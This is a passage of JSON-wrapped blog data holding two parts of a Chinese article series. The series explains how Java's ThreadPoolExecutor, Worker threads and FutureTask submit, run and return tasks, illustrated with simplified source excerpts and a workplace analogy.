创建不同特征的线程池ThreadPoolExecutor，例子中是使用newFixedThreadPool方法创建有n个固定工作线程的线程池。</li>\n<li>线程池是专门负责从外面接活的老大。把任务封装成一个FutureTask对象，并根据输入定义好要获得结果的类型，就可以submit任务了。</li>\n<li>线程池就像我们团队里管人管项目的老大，各个都有一套娴熟、有效的办法来对付输入的任务和手下干活的兄弟一样，内部有一套比较完整、细致的任务管理办法，工作线程管理办法，以便应付输入的任务。这些逻辑全部在其execute方法中体现。</li>\n<li>线程池接收输入的task，根据需要创建工作线程，启动工作线程来执行task。</li>\n<li>工作线程在其run方法中一直循环，从线程池领取可以执行的task，调用task的run方法执行task内定义的任务。</li>\n<li>FutureTask的run方法中调用其内部类Sync的innerRun方法来执行封装的具体任务，并把任务的执行结果返回给FutureTask的result变量。</li>\n<li>当提及任务的角色调用FutureTask的get方法获取执行结果时，Sync的innerGet方法被调用。根据任务的执行状态判断，任务执行完毕则返回执行结果；未执行完毕则等待。</li>\n</ol>\n\n<p>还记得我们费了半天劲试图找出任务执行时那个动宾结构的主语吗？从示例上看更像是线程池在向外提供任务执行的服务。就像我们的老大在代表我们接收任务、执行任务、提交执行结果。明显我们这些真正的Worker成了延伸，有点搞不懂到底我们是主语，还是主语延伸的工具，就像定义<code>ThreadPoolExecutor</code>的内部类Worker一样。我们只是工具，不是主语，是状语： execute the task by workers。突然想到毛主席当年的“数风流人物，还看今朝”，说的应该是这些Worker的劳苦大众吧，怎么都今朝这么久了，俺们这些Woker们还是风流不起来呢？风骚的作者居然在上面严肃的时序图上加了个风骚的小星星，向同行的Worker们致敬！</p>",
			"markdowncontent":"[上一篇文章](http://www.infoq.com/cn/articles/executor-framework-thread-pool-task-execution-part-01)中通过引入的一个例子介绍了在Executor框架下，提交一个任务的过程，这个过程就像我们老大的老大要找个老大来执行一个任务那样简单。并通过剖析ExecutorService的一种经典实现ThreadPoolExecutor来分析接收任务的主要逻辑，发现ThreadPoolExecutor的工作思路和我们带项目的老大的工作思路完全一致。在本文中我们将继续后面的步骤，着重描述下任务执行的过程和任务执行结果获取的过程。会很容易发现，这个过程我们更加熟悉，因为正是每天我们工作的过程。除了ThreadPoolExecutor的内部类Worker外，对执行内容和执行结果封装的FutureTask的表现是这部分着重需要了解的。\n\n为了连贯期间，内容的编号延续上篇。\n\n2. 任务执行\n其实应该说是任务被执行，任务是宾语。动宾结构：execute the task，执行任务，无论写成英文还是中文似乎都是这样。那么主语是是who呢？明显不是调用submit的那位（线程），那是哪位呢？上篇介绍ThreadPoolExecutor主要属性时提到其中有一个HashSet<Worker> workers的集合，我们有说明这里存储的就是线程池的工作队列的集合，队列的对象是Worker类型的工作线程，是ThreadPoolExecutor的一个内部类，实现了Runnable接口：\n```java \n    private final class Worker implements Runnable\n```\n8)  看作业线程干什么当然是看它的run方法在干什么。如我们所料，作业线程就是在一直调用getTask方法获取任务，然后调用 runTask(task)方法执行任务。看到没有，是在while循环里面，就是不干完不罢休的意思！在加班干活的苦逼的朋友们，有没有遇见战友的亲切感觉？\n```java \n        public void run() {\n                try {\n                    Runnable task = firstTask;\n                    //循环从线程池的任务队列获取任务\n                    while (task != null || (task = getTask()) != null) {\n                    //执行任务\n                        runTask(task);\n                        task = null;\n                    }\n                } finally {\n                    workerDone(this);\n                }\n            }\n```\n然后简单看下getTask和runTask(task)方法的内容。\n\n9) getTask方法是ThreadPoolExecutor提供给其内部类Worker的的方法。作用就是一个，从任务队列中取任务，源源不断地输出任务。有没有想到老大手里拿的总是满满当当的project，也是源源不断的。\n```java\n    Runnable getTask() {\n            for (;;) {\n                      //从任务队列的头部取任务\n                      r = workQueue.take();\n                        return r;\n     }\n        }\n```\n10) runTask(Runnable task)是工作线程Worker真正处理拿到的每个具体任务。看到这里才可用确认我们的猜想，[之前提到](之前提到)[[y1]](#_msocom_1) 的“执行任务”这个动宾结构前面的主语正是这些Worker呀。唠叨了半天（看主要方法都看到了整整第10个了），前面都是派活，这里才是干活。和我们的工作何其相似！老大（LD），老大的老大（LD^2），老大的老大（LD^n） 非常辛苦，花了很多时间、精力在会议室、在project上想着怎么生成和安排任务，然而真的轮到咱哥们干活，可能花了不少时间，但看看流程就是这么简单。**三个大字：“****Just do it****”。**\n```java \n      private void runTask(Runnable task) {          \n                       //调用任务的run方法，即在Worker线程中执行Task内定义内容。\n                        task.run();\n            }\n```\n需要注意的地方出现了，调用的其实是task的run方法。看下FutureTask的run方法做了什么事情。\n\n这里插入一个FutureTask的类图。可以看到FutureTask实现了RunnableFuture接口，所以FutureTask即有Runnable接口的run方法来定义任务内容，也有Future接口中定义的get、cancel等方法来控制任务执行和获取执行结果。Runnable接口自不用说，Future接口的伟大设计，就是使得实现该接口的对象可以阻塞线程直到任务执行完毕，也可以取消任务执行，检测任务是执行完毕还是被取消了。想想在之前我们使用Thread.join()或者Thread.join(long millis)等待任务结束是多么苦涩啊。\n\nFutureTask内部定义了一个Sync的内部类，继承自AQS，来维护任务状态。关于AQS的设计思路，可以参照参考Doug Lea大师的原著[The java.util.concurrent Synchronizer Framework](http://gee.cs.oswego.edu/dl/papers/aqs.pdf)。\n\n[![](http://cdn4.infoqstatic.com/statics_s2_20170208-0257_3/resource/articles/executor-framework-thread-pool-task-execution-part-02/zh/resources/0601001.jpg)](http://cdn4.infoqstatic.com/statics_s2_20170208-0257_3/resource/articles/executor-framework-thread-pool-task-execution-part-02/zh/resources/0601001.jpg)\n\n11) 和其他的同步工具类一样，FutureTask的主要工作内容也是委托给其定义的内部类Sync来完成。\n```java \n       public void run() {\n            //调用Sync的对应方法\n            sync.innerRun();\n        }\n```\n12)   FutureTask.Sync.innerRun()，这样做的目的就是为了维护任务执行的状态，只有当执行完后才能够获得任务执行结果。在该方法中，首先设置执行状态为RUNNING只有判断任务的状态是运行状态，才调用任务内封装的回调，并且在执行完成后设置回调的返回值到FutureTask的result变量上。在FutureTask中，innerRun等每个“写”方法都会首先修改状态位，在后续会看到innerGet等“读”方法会先判断状态，然后才能决定后续的操作是否可以继续。下图是FutureTask.Sync中几个重要状态的流转情况，和其他的同步工具类一样，状态位使用的也是父类AQS的state属性。\n\n\n[![](http://cdn4.infoqstatic.com/statics_s2_20170208-0257_3/resource/articles/executor-framework-thread-pool-task-execution-part-02/zh/resources/0601002.png)](http://cdn4.infoqstatic.com/statics_s2_20170208-0257_3/resource/articles/executor-framework-thread-pool-task-execution-part-02/zh/resources/0601002.png)\n```java \n    void innerRun() {\n                //通过对AQS的状态位state的判断来判断任务的状态是运行状态，则调用任务内封装的回调，并且设置回调的返回值\n                    if (getState() == RUNNING) \n                        innerSet(callable.call());   \n            }\n    \n        void innerSet(V v) {\n    \t    for (;;) {\n    \t\tint s = getState();\n    \t        //设置运行状态为完成，并且把回调额执行结果设置给result变量\n    \t\tif (compareAndSetState(s, RAN)) {\n                        result = v;\n                        releaseShared(0);\n                        done();\n    \t\t    return;\n                    }\n                }\n```\n至此工作线程执行Task就结束了。提交的任务是由Worker工作线程执行，正是在该线程上调用Task中定义的任务内容，即封装的Callable回调，并设置执行结果。下面就是最重要的部分：调用者如何获取执行的结果。让你加班那么久，总得把成果交出来吧。老大在等，因为老大的老大在等！\n\n3. 获取执行结果\n\n前面说过，对于老大的老大这样的使用者来说，获取执行结果这个过程总是最容易的事情，只需调用FutureTask的get()方法即可。该方法是在Future接口中就定义的。get方法的作用就是等待执行结果。（Waits if necessary for the computation to complete, and then retrieves its result.）Future这个接口命名得真好，虽然是在未来，但是定义有一个get()方法，总是“可以掌控的未来，总是有收获的未来！”实现该接口的FutureTask也应该是这个意思，在未来要完成的任务，但是一样要有结果哦。\n\n13)  FutureTask的get方法同样委托给Sync来执行。和该方法类似，还有一个V get(long timeout, TimeUnit unit)，可以配置超时时间。\n```java \n       public V get() throws InterruptedException, ExecutionException {\n            return sync.innerGet();\n        }\n```\n14)  在[Sync](Sync)的 innerGet方法中，调用AQS父类定义的获取共享锁的方法acquireSharedInterruptibly来等待执行完成。如果执行完成了则可以继续执行后面的代码，返回result结果，否则如果还未完成，则阻塞线程等待执行完成。[[bd2]](#_msocom_2) 再大的老大要想获得结果也得等老子干完了才行！可以看到调用FutureTask的get方法，进而调用到该方法的一定是想要执行结果的线程，一般应该就是提交Task的线程，而这个任务的执行是在Worker的工作线程上，通过AQS来保证执行完毕才能获取执行结果。该方法中acquireSharedInterruptibly是AQS父类中定义的获取共享锁的方法，[但是到底满足什么条件可以成功获取共享锁，这是](但是到底满足什么条件可以成功获取共享锁，这是)Sync的tryAcquireShared方法内定义的。[[bd3]](#_msocom_3) 具体说来，innerIsDone用来判断是否执行完毕，如果执行完毕则向下执行，返回result即可；如果判断未完成，则调用AQS的doAcquireSharedInterruptibly来挂起当前线程，一直到满足条件。这种思路在其他的几种同步工具类[Semaphore](http://docs.oracle.com/javase/7/docs/api/java/util/concurrent/Semaphore.html)、[CountDownLatch](http://docs.oracle.com/javase/7/docs/api/java/util/concurrent/CountDownLatch.html)、[ReentrantLock](http://docs.oracle.com/javase/7/docs/api/java/util/concurrent/locks/ReentrantLock.html)、[ReentrantReadWriteLock](http://docs.oracle.com/javase/7/docs/api/java/util/concurrent/locks/ReentrantReadWriteLock.html)也广泛使用。借助AQS框架，在获取锁时，先判断当前状态是否允许获取锁，若是允许则获取锁，否则获取不成功。获取不成功则会阻塞，进入阻塞队列。而释放锁时，一般会修改状态位，唤醒队列中的阻塞线程。每个同步工具类的自定义同步器都继承自AQS父类，是否可以获取锁根据同步类自身的功能要求覆盖AQS对应的try前缀方法，这些方法在AQS父类中都是只有定义没有内容。可以参照《[源码剖析AQS在几个同步工具类中的使用](http://www.idouba.net/sync-implementation-by-aqs/)》来详细了解。\n\n突然想到想想那些被称为老大的，是不是整个career流程就是只干两件事情：submit a task， then wait and get the result。不对，还有一件事情，不是等待，而是催。“完了没，完了没？schedule很紧的，抓点紧啊，要不要适当加点班啊……”\n```java \n    V innerGet() throws InterruptedException, ExecutionException {\n               //获得锁，表示执行完毕，才能获得后执行结果，否则阻塞等待执行完成再获取执行结果\n                acquireSharedInterruptibly(0);\n                return result;\n            }\n    \n            protected int tryAcquireShared(int ignore) {\n                return innerIsDone()? 1 : -1;\n            }\n```\n至此，获得执行结果，圆满完成任务！\n\n老大的老大，拍着咱们老大的肩膀（或者深情的抚摸着咱们老大唏嘘胡茬的脸庞）说：“亲，你这活干的漂亮！”而隔壁桌座位的几个兄弟，刚熬了几个晚上加班交付完这波task后，发现任务队列里又有新任务了，俺们老大又从他的另外一个老大手里接来的任务了。每个人都按照这样的角色进行着，依照这样的角色安排和谐愉快地进行着。。。\n\n**角色名**\n\n**任务用户**\n\n**任务管理者**\n\n**任务执行者**\n\n角色属性\n\n任务的甲方\n\n任务的乙方\n\n乙方的工具\n\n角色说明\n\n选择合适的任务执行服务，如可以根据需要选择ThreadPoolExecutor还是ScheduledThreadPoolExecutor，并定制ExecutorService的配置。\n\n\t\t\t定义好任务的工作内容和结果类型，提交任务，等待任务的执行结果\n\n接收提交的任务；\n\n\t\t\t维护执行服务内部管理；\n\n\t\t\t配置工作线程执行任务\n\n每个工作线程一直从任务执行服务获取待执行的任务，保证任务完成后返回执行结果。\n\nExecutor中对应\n\n创建获取ExecutorService、并提交Task的外部接口\n\nExecutorService的各种实现。如经典的ThreadPoolExecutor，ScheduledThreadPoolExecutor\n\n执行服务内定义的配套的Worker线程。如ThreadPoolExecutor.Worker\n\n主要接口方法\n```java \n\nsubmit(Callable task)\n\nexecute(Runnable command)\n\nrunTask(Runnable task)\n```\n现实角色映射\n\n手里有活的大老大\n\n领人干活的老大\n\n真正干活的码农\n\n主要工作伪代码\n```java \ntaskService = createService()\n\n\t\t\tfuture=taskService.submitTask()\n\n\t\t\tfuture.get()\n\nexecuteTask()\n\n\t\t\t{ addTask()\n\n\t\t\tcreateThread()\n\n\t\t\t}\n\nwhile(ture) {\n\n\t\t\tgetTask()\n\n\t\t\trunTask()\n\n\t\t\t}\n```\n##### 四、 总结\n\n从时序图上看主要的几个角色是这样配合完成任务提交、任务执行、获取执行结果这几个步骤的。\n\n[![](http://cdn4.infoqstatic.com/statics_s2_20170208-0257_3/resource/articles/executor-framework-thread-pool-task-execution-part-02/zh/resources/0601003.png)](http://cdn4.infoqstatic.com/statics_s2_20170208-0257_3/resource/articles/executor-framework-thread-pool-task-execution-part-02/zh/resources/0601003.png)\n\n1. 外面需要提交任务的角色（如例子中老大的老大），首先创建一个任务执行服务ExecutorService，一般使用工具类Executors的若干个工厂方法 创建不同特征的线程池ThreadPoolExecutor，例子中是使用newFixedThreadPool方法创建有n个固定工作线程的线程池。\n2. 线程池是专门负责从外面接活的老大。把任务封装成一个FutureTask对象，并根据输入定义好要获得结果的类型，就可以submit任务了。\n3. 线程池就像我们团队里管人管项目的老大，各个都有一套娴熟、有效的办法来对付输入的任务和手下干活的兄弟一样，内部有一套比较完整、细致的任务管理办法，工作线程管理办法，以便应付输入的任务。这些逻辑全部在其execute方法中体现。\n4. 线程池接收输入的task，根据需要创建工作线程，启动工作线程来执行task。\n5. 工作线程在其run方法中一直循环，从线程池领取可以执行的task，调用task的run方法执行task内定义的任务。\n6. FutureTask的run方法中调用其内部类Sync的innerRun方法来执行封装的具体任务，并把任务的执行结果返回给FutureTask的result变量。\n7. 当提及任务的角色调用FutureTask的get方法获取执行结果时，Sync的innerGet方法被调用。根据任务的执行状态判断，任务执行完毕则返回执行结果；未执行完毕则等待。\n\n还记得我们费了半天劲试图找出任务执行时那个动宾结构的主语吗？从示例上看更像是线程池在向外提供任务执行的服务。就像我们的老大在代表我们接收任务、执行任务、提交执行结果。明显我们这些真正的Worker成了延伸，有点搞不懂到底我们是主语，还是主语延伸的工具，就像定义`ThreadPoolExecutor`的内部类Worker一样。我们只是工具，不是主语，是状语： execute the task by workers。突然想到毛主席当年的“数风流人物，还看今朝”，说的应该是这些Worker的劳苦大众吧，怎么都今朝这么久了，俺们这些Woker们还是风流不起来呢？风骚的作者居然在上面严肃的时序图上加了个风骚的小星星，向同行的Worker们致敬！",
			"tags":"线程池,框架",
			"id":"55101091",
			"categories":"JAVA基础",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2017年02月14日 16:11:34",
			"articleedittype":1,
			"private":0,
			"channel":"16",
			"description":"一、前言1.5后引入的Executor框架的最大优点是把任务的提交和执行解耦。要执行任务的人只需把Task描述清楚，然后提交即可。这个Task是怎么被执行的，被谁执行的，什么时候执行的，提交的人就不用关心了。具体点讲，提交一个Callable对象给ExecutorService（如最常用的线程池ThreadPoolExecutor），将得到一个Future对象，调用Future对象的get方法等待执",
			"title":"戏（细）说Executor框架线程池任务执行全过程（上）",
			"type":"repost",
			"content":"<h2 id=\"一前言\">一、前言</h2>\n\n<p>1.5后引入的Executor框架的最大优点是把任务的提交和执行解耦。要执行任务的人只需把Task描述清楚，然后提交即可。这个Task是怎么被执行的，被谁执行的，什么时候执行的，提交的人就不用关心了。具体点讲，提交一个Callable对象给<code>ExecutorService</code>（如最常用的线程池ThreadPoolExecutor），将得到一个Future对象，调用Future对象的get方法等待执行结果就好了。</p>\n\n<p>经过这样的封装，对于使用者来说，提交任务获取结果的过程大大简化，调用者直接从提交的地方就可以等待获取执行结果。而封装最大的效果是使得真正执行任务的线程们变得不为人知。有没有觉得这个场景似曾相识？我们工作中当老大的老大（且称作LD^2）把一个任务交给我们老大（LD）的时候，到底是LD自己干，还是转过身来拉来一帮苦逼的兄弟加班加点干，那LD^2是不管的。LD^2只用把人描述清楚提及给LD，然后喝着咖啡等着收LD的report即可。等LD一封邮件非常优雅地报告LD^2report结果时，实际操作中是码农A和码农B干了一个月，还是码农ABCDE加班干了一个礼拜，大多是不用体现的。这套机制的优点就是LD^2找个合适的LD出来提交任务即可，接口友好有效，不用为具体怎么干费神费力。</p>\n\n<h2 id=\"二-一个最简单的例子\">二、 一个最简单的例子</h2>\n\n<p>看上去这个执行过程是这个样子。调用这段代码的是老大的老大了，他所需要干的所有事情就是找到一个合适的老大（如下面例子中laodaA就荣幸地被选中了），提交任务就好了。</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \">    <span class=\"hljs-comment\">// 一个有7个作业线程的线程池，老大的老大找到一个管7个人的小团队的老大</span>\n           ExecutorService laodaA = Executors.newFixedThreadPool(<span class=\"hljs-number\">7</span>);\n             <span class=\"hljs-comment\">//提交作业给老大，作业内容封装在Callable中，约定好了输出的类型是String。</span>\n                String outputs = laoda.submit(\n                         <span class=\"hljs-keyword\">new</span> Callable&lt;String&gt;() {\n                             <span class=\"hljs-keyword\">public</span> String <span class=\"hljs-title\">call</span>() <span class=\"hljs-keyword\">throws</span> Exception \n                             {                          \n                                 <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"I am a task, which submited by the so called laoda, and run by those anonymous workers\"</span>;\n                             }\n                             <span class=\"hljs-comment\">//提交后就等着结果吧，到底是手下7个作业中谁领到任务了，老大是不关心的。</span>\n                         }).get();\n\n                System.out.println(outputs);</code></pre>\n\n<p>使用上非常简单，其实只有两行语句来完成所有功能：创建一个线程池，提交任务并等待获取执行结果。</p>\n\n<p>例子中生成线程池采用了工具类Executors的静态方法。除了newFixedThreadPool可以生成固定大小的线程池，newCachedThreadPool可以生成一个无界、可以自动回收的线程池，newSingleThreadScheduledExecutor可以生成一个单个线程的线程池。newScheduledThreadPool还可以生成支持周期任务的线程池。一般用户场景下各种不同设置要求的线程池都可以这样生成，不用自己new一个线程池出来。</p>\n\n<h2 id=\"三代码剖析\">三、代码剖析</h2>\n\n<p>这套机制怎么用，上面两句语句就做到了，非常方便和友好。但是submit的task是怎么被执行的？是谁执行的？如何做到在调用的时候只有等待执行结束才能get到结果。这些都是1.5之后Executor接口下的线程池、Future接口下的可获得执行结果的的任务，配合AQS和原有的Runnable来做到的。在下文中我们尝试通过剖析每部分的代码来了解Task提交，Task执行，获取Task执行结果等几个主要步骤。为了控制篇幅，突出主要逻辑，文章中引用的代码片段去掉了异常捕获、非主要条件判断、非主要操作。文中只是以最常用的ThreadPoolExecutor线程池举例，其实ExecutorService接口下定义了很多功能丰富的其他类型，有各自的特点，但风格类似。本文重点是介绍任务提交的过程，过程中涉及的ExecutorService、ThreadPoolExecutor、AQS、Future、FutureTask等只会介绍该过程中用到的内容，不会对每个类都详细展开。</p>\n\n<p>1、 任务提交</p>\n\n<p>从类图上可以看到，接口ExecutorService继承自Executor。不像Executor中只定义了一个方法来执行任务，在ExecutorService中，正如其名字暗示的一样，定义了一个服务，定义了完整的线程池的行为，可以接受提交任务、执行任务、关闭服务。抽象类AbstractExecutorService类实现了ExecutorService接口，也实现了接口定义的默认行为。</p>\n\n<p><a href=\"http://cdn.infoqstatic.com/statics_s2_20170208-0257_3/resource/articles/executor-framework-thread-pool-task-execution-part-01/zh/resources/0601000.jpg\"><img src=\"http://cdn.infoqstatic.com/statics_s2_20170208-0257_3/resource/articles/executor-framework-thread-pool-task-execution-part-01/zh/resources/0601000.jpg\" alt=\"\" title=\"\"></a></p>\n\n<p>AbstractExecutorService任务提交的submit方法有三个实现。第一个接收一个Runnable的Task，没有执行结果；第二个是两个参数：一个任务，一个执行结果；第三个一个Callable，本身就包含执任务内容和执行结果。 submit方法的返回结果是Future类型，调用该接口定义的get方法即可获得执行结果。<em>* V get() 方法的返回值类型V是在提交任务时就约定好了的。*</em></p>\n\n<p>除了submit任务的方法外，作为对服务的管理，在ExecutorService接口中还定义了服务的关闭方法shutdown和shutdownNow方法，可以平缓或者立即关闭执行服务，实现该方法的子类根据自身特征支持该定义。在ThreadPoolExecutor中，维护了RUNNING、SHUTDOWN、STOP、TERMINATED四种状态来实现对线程池的管理。线程池的完整运行机制不是本文的重点，重点还是关注submit过程中的逻辑。</p>\n\n<p>1) 看AbstractExecutorService中代码提交部分，构造好一个FutureTask对象后，调用execute()方法执行任务。我们知道这个方法是顶级接口Executor中定义的最重要的方法。。FutureTask类型实现了Runnable接口，因此满足Executor中execute()方法的约定。同时比较有意思的是，该对象在execute执行后，就又作为submit方法的返回值返回，因为FutureTask同时又实现了Future接口，满足Future接口的约定。</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \">      <span class=\"hljs-keyword\">public</span> &lt;T&gt; Future&lt;T&gt; <span class=\"hljs-title\">submit</span>(Callable&lt;T&gt; task) {\n            <span class=\"hljs-keyword\">if</span> (task == <span class=\"hljs-keyword\">null</span>) <span class=\"hljs-keyword\">throw</span> <span class=\"hljs-keyword\">new</span> NullPointerException();\n            RunnableFuture&lt;T&gt; ftask = newTaskFor(task);\n            execute(ftask);\n            <span class=\"hljs-keyword\">return</span> ftask;\n        }</code></pre>\n\n<p>2) Submit传入的参数都被封装成了FutureTask类型来execute的，对应前面三个不同的参数类型都会封装成FutureTask。</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \">       <span class=\"hljs-keyword\">protected</span> &lt;T&gt; RunnableFuture&lt;T&gt; <span class=\"hljs-title\">newTaskFor</span>(Callable&lt;T&gt; callable) {\n            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> FutureTask&lt;T&gt;(callable);\n        }</code></pre>\n\n<p>3) Executor接口中定义的execute方法的作用就是执行提交的任务，该方法在抽象类AbstractExecutorService中没有实现，留到子类中实现。我们观察下子类ThreadPoolExecutor，使用最广泛的线程池如何来execute那些submit的任务的。这个方法看着比较简单，但是线程池什么时候创建新的作业线程来处理任务，什么时候只接收任务不创建作业线程，另外什么时候拒绝任务。线程池的接收任务、维护工作线程的策略都要在其中体现。</p>\n\n<p>作为必要的预备知识，先补充下ThreadPoolExecutor有两个最重要的集合属性，分别是存储接收任务的任务队列和用来干活的作业集合。</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \">    <span class=\"hljs-comment\">//任务队列</span>\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">final</span> BlockingQueue&lt;Runnable&gt; workQueue;\n    <span class=\"hljs-comment\">//作业线程集合</span>\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">final</span> HashSet&lt;Worker&gt; workers = <span class=\"hljs-keyword\">new</span> HashSet&lt;Worker&gt;();</code></pre>\n\n<p>其中阻塞队列workQueue是来存储待执行的任务的，在构造线程池时可以选择满足该BlockingQueue 接口定义的SynchronousQueue、LinkedBlockingQueue或者DelayedWorkQueue等不同阻塞队列来实现不同特征的线程池。</p>\n\n<p>关注下execute(Runnable command)方法中调用到的addIfUnderCorePoolSize，workQueue.offer(command) ， ensureQueuedTaskHandled(command)，addIfUnderMaximumPoolSize(command)这几个操作。尤其几个名字较长的private方法，把方法名的驼峰式的单词分开，加上对方法上下文的了解就能理解其功能。</p>\n\n<p>因为前面说到的几个方法在里面即是操作，又返回一个布尔值，影响后面的逻辑，所以不大方便在方法体中为每条语句加注释来说明，需要大致关联起来看。所以首先需要把execute方法的主要逻辑说明下，再看其中各自方法的作用。</p>\n\n<ul>\n<li>如果线程池的状态是RUNNING，线程池的大小小于配置的核心线程数，说明还可以创建新线程，则启动新的线程执行这个任务。</li>\n<li>如果线程池的状态是RUNNING ，线程池的大小小于配置的最大线程数，并且任务队列已经满了，说明现有线程已经不能支持当前的任务了，并且线程池还有继续扩充的空间，就可以创建一个新的线程来处理提交的任务。</li>\n<li>如果线程池的状态是RUNNING，当前线程池的大小大于等于配置的核心线程数，说明根据配置当前的线程数已经够用，不用创建新线程，只需把任务加入任务队列即可。如果任务队列不满，则提交的任务在任务队列中等待处理；如果任务队列满了则需要考虑是否要扩展线程池的容量。</li>\n<li>当线程池已经关闭或者上面的条件都不能满足时，则进行拒绝策略，拒绝策略在RejectedExecutionHandler接口中定义，可以有多种不同的实现。</li>\n</ul>\n\n<p>上面其实也是对最主要思路的解析，详细展开可能还会更复杂。简单梳理下思路：构建线程池时定义了一个额定大小，当线程池内工作线程数小于额定大小，有新任务进来就创建新工作线程，如果超过该阈值，则一般就不创建了，只是把接收任务加到任务队列里面。但是如果任务队列里的任务实在太多了，那还是要申请额外的工作线程来帮忙。如果还是不够用就拒绝服务。这个场景其实也是每天我们工作中会碰到的场景。我们管人的老大，手里都有一定HC（Head Count），当上面老大有活分下来，手里人不够，但是不超过HC，我们就自己招人；如果超过了还是忙不过来，那就向上门老大申请借调人手来帮忙；如果还是干不完，那就没办法了，新任务咱就不接了。</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \">    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">execute</span>(Runnable command) {\n            <span class=\"hljs-keyword\">if</span> (command == <span class=\"hljs-keyword\">null</span>)\n                <span class=\"hljs-keyword\">throw</span> <span class=\"hljs-keyword\">new</span> NullPointerException();\n            <span class=\"hljs-keyword\">if</span> (poolSize &gt;= corePoolSize || !addIfUnderCorePoolSize(command)) {\n                <span class=\"hljs-keyword\">if</span> (runState == RUNNING &amp;&amp; workQueue.offer(command)) {\n                    <span class=\"hljs-keyword\">if</span> (runState != RUNNING || poolSize == <span class=\"hljs-number\">0</span>)\n                        ensureQueuedTaskHandled(command);\n                }\n                <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span> (!addIfUnderMaximumPoolSize(command))\n                    reject(command); <span class=\"hljs-comment\">// is shutdown or saturated</span>\n            }\n    }</code></pre>\n\n<p>4) addIfUnderCorePoolSize方法检查如果当前线程池的大小小于配置的核心线程数，说明还可以创建新线程，则启动新的线程执行这个任务。</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \">       <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">boolean</span> <span class=\"hljs-title\">addIfUnderCorePoolSize</span>(Runnable firstTask) {\n            Thread t = <span class=\"hljs-keyword\">null</span>;\n           <span class=\"hljs-comment\">//如果当前线程池的大小小于配置的核心线程数，说明还可以创建新线程</span>\n                <span class=\"hljs-keyword\">if</span> (poolSize &lt; corePoolSize &amp;&amp; runState == RUNNING)\n          <span class=\"hljs-comment\">// 则启动新的线程执行这个任务</span>\n                    t = addThread(firstTask);        \n            <span class=\"hljs-keyword\">return</span> t != <span class=\"hljs-keyword\">null</span>;\n        }</code></pre>\n\n<p>5)  和上一个方法类似，addIfUnderMaximumPoolSize检查如果线程池的大小小于配置的最大线程数，并且任务队列已经满了（就是execute方法试图把当前线程加入任务队列时不成功），说明现有线程已经不能支持当前的任务了，但线程池还有继续扩充的空间，就可以创建一个新的线程来处理提交的任务。</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \">        <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">boolean</span> <span class=\"hljs-title\">addIfUnderMaximumPoolSize</span>(Runnable firstTask) {\n               <span class=\"hljs-comment\">// 如果线程池的大小小于配置的最大线程数，并且任务队列已经满了（就</span>\n    是execute方法中试图把当前线程加入任务队列workQueue.offer(command)时候不成功\n    ）,说明现有线程已经不能支持当前的任务了，但线程池还有继续扩充的空间       \n                <span class=\"hljs-keyword\">if</span> (poolSize &lt; maximumPoolSize &amp;&amp; runState == RUNNING)\n              <span class=\"hljs-comment\">//就可以创建一个新的线程来处理提交的任务</span>\n                t = addThread(firstTask);           \n            <span class=\"hljs-keyword\">return</span> t != <span class=\"hljs-keyword\">null</span>;\n        }</code></pre>\n\n<p>6)  在ensureQueuedTaskHandled方法中，判断如果当前状态不是RUNING，则当前任务不加入到任务队列中，判断如果状态是停止，线程数小于允许的最大数，且任务队列还不空，则加入一个新的工作线程到线程池来帮助处理还未处理完的任务。</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \">    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">ensureQueuedTaskHandled</span>(Runnable command) {\n                <span class=\"hljs-comment\">//  如果当前状态不是RUNING，则当前任务不加入到任务队列中，判断如</span>\n    果状态是停止，线程数小于允许的最大数，且任务队列还不空\n                 <span class=\"hljs-keyword\">if</span> (state &lt; STOP &amp;&amp;\n                         poolSize &lt; Math.max(corePoolSize, <span class=\"hljs-number\">1</span>) &amp;&amp;\n                         !workQueue.isEmpty())\n                <span class=\"hljs-comment\">//则加入一个新的工作线程到线程池来帮助处理还未处理完的任务</span>\n                    t = addThread(<span class=\"hljs-keyword\">null</span>);\n            <span class=\"hljs-keyword\">if</span> (reject)\n                reject(command);\n        }</code></pre>\n\n<p>7)   在前面方法中都会调用adThread方法创建一个工作线程，差别是创建的有些工作线程上面关联接收到的任务firstTask，有些没有。该方法为当前接收到的任务firstTask创建Worker，并将Worker添加到作业集合HashSet workers中，并启动作业。</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \">    <span class=\"hljs-keyword\">private</span> Thread <span class=\"hljs-title\">addThread</span>(Runnable firstTask) {\n            <span class=\"hljs-comment\">//为当前接收到的任务firstTask创建Worker</span>\n            Worker w = <span class=\"hljs-keyword\">new</span> Worker(firstTask);\n            Thread t = threadFactory.newThread(w);\n                w.thread = t;\n           <span class=\"hljs-comment\">//将Worker添加到作业集合HashSet&lt;Worker&gt; workers中，并启动作业</span>\n                workers.add(w);\n                    t.start();\n            <span class=\"hljs-keyword\">return</span> t;\n        